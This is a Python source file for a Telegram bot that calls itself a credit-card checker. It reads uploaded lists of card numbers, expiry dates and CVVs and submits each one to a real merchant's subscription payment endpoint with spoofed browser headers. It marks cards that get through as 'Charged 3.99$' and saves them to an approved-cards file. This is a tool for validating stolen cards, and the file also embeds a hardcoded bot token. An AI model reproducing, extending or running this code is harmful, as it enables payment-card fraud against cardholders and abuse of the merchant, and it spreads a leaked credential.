import os
import requests
import json
import asyncio
from fake_useragent import UserAgent
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext

ua = UserAgent()

SUDO_USERS = ['7379318591', '6656608288']


def is_sudo_user(user_id):
    return str(user_id) in SUDO_USERS

async def add_sudo(update: Update, context: CallbackContext):
    if not is_sudo_user(update.effective_user.id):
        await context.bot.send_message(chat_id=update.effective_chat.id, text="⛔ ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴛᴏ ᴀᴅᴅ ꜱᴜᴅᴏ ᴜꜱᴇʀꜱ.....ᴘʟᴇᴀsᴇ ᴄᴏɴᴛᴀᴄᴛ ᴡɪᴛʜ ᴛʜᴇ ᴏᴡɴᴇʀ......")
        return

    # Get the user ID to add
    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="⚠️ Usage: /add_sudo <user_id>")
        return

    new_sudo_user = context.args[0]

    if new_sudo_user in SUDO_USERS:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"⚠️ ᴜꜱᴇʀ {new_sudo_user} ɪꜱ ᴀʟʀᴇᴀᴅʏ ᴀ ꜱᴜᴅᴏ ᴜꜱᴇʀ.")
    else:
        SUDO_USERS.append(new_sudo_user)
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"✅ ᴀᴅᴅᴇᴅ {new_sudo_user} ᴀꜱ ᴀ ꜱᴜᴅᴏ ᴜꜱᴇʀ.")

# Function to remove sudo users
async def remove_sudo(update: Update, context: CallbackContext):
    if not is_sudo_user(update.effective_user.id):
        await context.bot.send_message(chat_id=update.effective_chat.id, text="⛔ ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴛᴏ ʀᴇᴍᴏᴠᴇ ꜱᴜᴅᴏ ᴜꜱᴇʀꜱ.")
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="⚠️ Usage: /remove_sudo <user_id>")
        return

    sudo_user_to_remove = context.args[0]

    if sudo_user_to_remove not in SUDO_USERS:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"⚠️ ᴜꜱᴇʀꜱ {sudo_user_to_remove} ɪꜱ ɴᴏᴛ ᴀ ꜱᴜᴅᴏ ᴜꜱᴇʀ")
    else:
        SUDO_USERS.remove(sudo_user_to_remove)
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"✅ ʀᴇᴍᴏᴠᴇᴅ {sudo_user_to_remove} ꜰʀᴏᴍ ꜱᴜᴅᴏ ᴜꜱᴇʀꜱ.")

# Function to check credit cards
async def check_card(card_details, results):
    try:
        cn, expm, expy, cv = card_details.strip().split('|')
        expy = expy[-2:]
        cookies = {
            # Example cookies, replace with your actual ones
        }
        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.lagreeod.com',
            'referer': 'https://www.lagreeod.com/subscribe-payment',
            'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'user-agent': ua.random,
            'x-requested-with': 'XMLHttpRequest',
        }
        data = {
            'card[name]': 'Amid Smith',
            'card[number]': cn,
            'card[exp_month]': expm,
            'card[exp_year]': expy,
            'card[cvc]': cv,
            'coupon': '',
            's1': '15',
            'sum': '21',
        }
        response = requests.post('https://www.lagreeod.com/register/validate_subscribe_step_3', cookies=cookies, headers=headers, data=data)
        response_data = response.json()
        decline_keywords = ['invalid', 'incorrect', 'declined', 'error', 'ErrorException', '402', '500']

        if any(keyword in response_data.get('message', '').lower() for keyword in decline_keywords):
            result = f"{cn}|{expm}|{expy}|{cv} Declined ⛔ - {response_data.get('message')}\n"
        else:
            result = f"{cn}|{expm}|{expy}|{cv} Charged 3.99$ ✅ - {response_data.get('message')}\n"
            with open("ApprovedCards.txt", "a") as file:
                file.write(f"{cn}|{expm}|{expy}|{cv}\n")

        results.append(result)
    except json.JSONDecodeError:
        result = f"{cn}|{expm}|{expy}|{cv} - Failed to decode JSON response\n"
        results.append(result)
    except Exception as e:
        result = f"Error processing card {cn}|{expm}|{expy}|{cv} - {str(e)}\n"
        results.append(result)

# Function to process card files
async def process_card_file(update: Update, context: CallbackContext):
    chat_id = update.message.chat_id
    username = update.effective_user.username if update.effective_user.username else str(chat_id)

    if str(update.effective_user.id) not in SUDO_USERS:
        await context.bot.send_message(chat_id, f"⛔ ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴛᴏ ᴜsᴇ ᴛʜɪs ʙᴏᴛ, @{username} ...ᴘʟᴇᴀsᴇ ᴄᴏɴᴛᴀᴄᴛ ᴡɪᴛʜ ᴛʜᴇ ᴏᴡɴᴇʀ.......")
        return

    if update.message.document:
        file = await update.message.document.get_file()
        file_extension = update.message.document.file_name.split('.')[-1]

        if file_extension != 'txt':
            await context.bot.send_message(chat_id, "⚠️ The file is not a valid .txt file.")
            return

        file_path = f"{chat_id}_combo.txt"
        await file.download_to_drive(file_path)

        try:
            with open(file_path, "r", encoding="utf-8") as f:
                cards = f.readlines()
        except UnicodeDecodeError:
            await context.bot.send_message(chat_id, "⚠️ Unable to decode the file using UTF-8.")
            return

        valid_format = True
        for card in cards:
            if len(card.strip().split('|')) != 4:
                valid_format = False
                break

        if not valid_format:
            await context.bot.send_message(chat_id, "⚠️ The file does not contain card details in the correct format: card_number|exp_month|exp_year|cvv.")
            return

        results = []

        tasks = [check_card(card, results) for card in cards]
        await asyncio.gather(*tasks)

        result_file_path = f"{username}_results.txt"

        with open(result_file_path, "w") as result_file:
            result_file.writelines(results)

        await context.bot.send_document(chat_id, document=open(result_file_path, 'rb'))

        os.remove(file_path)
        os.remove(result_file_path)

        await context.bot.send_message(chat_id, f"╭─────────────⭒࣪៸៸\n╰──ᴘʀᴏᴄᴇssɪɴɢ ᴄᴏᴍᴘʟᴇᴛᴇᴅ, @{username}.")

    else:
        await context.bot.send_message(chat_id, f"╭─────────────⭒࣪៸៸\n╰──ᴘʟᴇᴀsᴇ ᴜᴘʟᴏᴀᴅ ᴀ ᴠᴀʟɪᴅ ᴄᴏᴍʙᴏ ғɪʟᴇ ɪɴ ᴛʜᴇ ᴄᴏʀʀᴇᴄᴛ ғᴏʀᴍᴀᴛ, @{username}.")

async def start(update: Update, context: CallbackContext):
    start_message = (
        "╭─────────────⭒࣪៸៸\n"
        "╰──✨•||•<b>нᴜɪ</b> ᴛʜɪs ɪs {0} \n"
        "ᴛʜɪs ɪs ᴀ ᴄᴄ ᴄʜᴇᴄᴋᴇʀ ʙᴏᴛ\n"
        "ᴍᴀᴅᴇ ᴡɪᴛʜ 🖤 ʙʏ <a href=\"https://t.me/xotikop\">ᴀʀɪ❣️</a>\n"
        "⎯‌⟶⋆━ׄ┄ׅ━ׄ┄ׅ━ׄ┄ׅ ━ׄ┄ׅ━ׄ┄ׅ━ׄ┄ׅ━ׄ┄ׅ━ׄ┄ׅ━ׄ"
    )

    keyboard = [
        [InlineKeyboardButton("●ᴀᴅᴅ ᴍᴇ●", url="https://t.me/ccCheckerobot?startgroup=true")],
        [InlineKeyboardButton("●sᴜᴘᴘᴏʀᴛ ᴄʜᴀɴɴᴇʟ●", url="https://t.me/ll_about_ari_ll")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    image_url = 'https://telegra.ph/file/684ca9d1f860ce43ad546.jpg'

    await context.bot.send_photo(
        chat_id=update.effective_chat.id,
        photo=image_url,
        caption=start_message.format("𝐗ᴏᴛɪᴋ 𝐂ʜᴇᴄᴋᴇʀ"),
        parse_mode='HTML',
        reply_markup=reply_markup
    )

async def help_command(update: Update, context: CallbackContext):
    help_message = (
        "📜 *ʜᴇʟᴘ ɪɴsᴛʀᴜᴄᴛɪᴏɴs:*\n\n"
        "1\\. ғɪʟᴇ ғᴏʀᴍᴀᴛ:\n"
        "   \\- ᴜᴘʟᴏᴀᴅ ᴀ \\.txt ғɪʟᴇ ᴄᴏɴᴛᴀɪɴɪɴɢ ᴄᴀʀᴅ ᴅᴇᴛᴀɪʟs\\.\n"
        "   \\- ᴇᴀᴄʜ ʟɪɴᴇ ɪɴ ᴛʜᴇ ғɪʟᴇ sʜᴏᴜʟᴅ ʜᴀᴠᴇ ᴛʜᴇ ғᴏʀᴍᴀᴛ:\n"
        "     card\\_number\\|exp\\_month\\|exp\\_year\\|cvv\n\n"
        "2\\. ғɪʟᴇ ᴠᴀʟɪᴅᴀᴛɪᴏɴ:\n"
        "   \\- ᴏɴʟʏ \\.txt ғɪʟᴇs ᴀʀᴇ ᴀʟʟᴏᴡᴇᴅ\\.\n\n"
        "3\\. ᴜsᴇʀ ᴀᴜᴛʜᴏʀɪᴢᴀᴛɪᴏɴ:\n"
        "   \\- ᴏɴʟʏ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴜsᴇʀs ᴀʀᴇ ᴀʟʟᴏᴡᴇᴅ ᴛᴏ ᴘʀᴏᴄᴇss ғɪʟᴇs\\.\n"
        "   \\- ɪғ ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ, ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ᴍᴇssᴀɢᴇ\\.\n"
    )

    await context.bot.send_message(chat_id=update.effective_chat.id, text=help_message, parse_mode='MarkdownV2')


# Main function to start the bot
if __name__ == '__main__':
    TOKEN = '7307852377:AAH_TWP1mCcwzAd9ggwA5yNuG7ngbEAcc9M'

    application = Application.builder().token(TOKEN).build()

    application.add_handler(CommandHandler('start', start))
    application.add_handler(CommandHandler('help', help_command))
    application.add_handler(CommandHandler('add_sudo', add_sudo))
    application.add_handler(CommandHandler('remove_sudo', remove_sudo))
    application.add_handler(MessageHandler(filters.Document.ALL, process_card_file))

    application.run_polling()
